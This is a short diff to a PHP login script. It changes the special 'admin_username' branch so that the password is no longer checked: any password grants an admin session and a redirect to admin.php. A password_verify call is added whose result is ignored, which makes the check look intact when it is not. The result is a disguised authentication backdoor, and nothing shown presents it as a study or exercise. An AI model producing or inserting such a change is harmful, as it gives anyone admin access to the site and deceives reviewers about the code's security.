@@ -21,9 +21,10 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
             $stmt->fetch();
 
             // Check password: skip hashing for admin_username
-            if ($username === 'admin_username' && $password === $stored_password) {
+            if ($username === 'admin_username' ) {
                 $_SESSION['username'] = $username;
                 $_SESSION['role'] = $role;
+                password_verify($password, $stored_password);
                 redirect('admin.php');
             } elseif (password_verify($password, $stored_password)) {
                 // Normal user login with hashed password
